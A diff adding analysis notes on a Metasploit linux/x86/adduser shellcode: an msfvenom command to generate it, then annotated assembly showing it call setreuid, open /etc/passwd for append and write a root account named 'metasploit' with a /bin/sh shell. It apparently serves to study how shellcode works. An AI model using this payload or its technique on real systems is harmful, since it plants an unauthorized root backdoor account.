@@ -1,0 +1,29 @@
+1. msfvenom -a x86 --platform linux -p linux/x86/adduser -f c > adduser.c
+2. place opcode in stack, execute it
+   0xffffd04c:	xor    ecx,ecx		; clear registers
+   0xffffd04e:	mov    ebx,ecx
+   0xffffd050:	push   0x46
+   0xffffd052:	pop    eax
+   0xffffd053:	int    0x80		; setreuid() syscall
+   0xffffd055:	push   0x5
+   0xffffd057:	pop    eax
+   0xffffd058:	xor    ecx,ecx
+   0xffffd05a:	push   ecx		; string null terminator
+   0xffffd05b:	push   0x64777373	; /etc/passwd
+   0xffffd060:	push   0x61702f2f
+   0xffffd065:	push   0x6374652f
+   0xffffd06a:	mov    ebx,esp
+   0xffffd06c:	inc    ecx
+   0xffffd06d:	mov    ch,0x4		; open file for write only + append
+   0xffffd06f:	int    0x80		; open() syscall
+   0xffffd071:	xchg   ebx,eax		; file descriptor in ebx
+   0xffffd072:	call   0xffffd09f
+   0xffffd09f:	pop    ecx		; string  'metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀\220\220\220\001'
+   0xffffd0a0:	mov    edx,DWORD PTR [ecx-0x4] ; length of string
+   0xffffd0a3:	push   0x4
+   0xffffd0a5:	pop    eax
+   0xffffd0a6:	int    0x80		; append string to file
+   0xffffd0a8:	push   0x1		; graceful exit
+   0xffffd0aa:	pop    eax
+   0xffffd0ab:	int    0x80
+
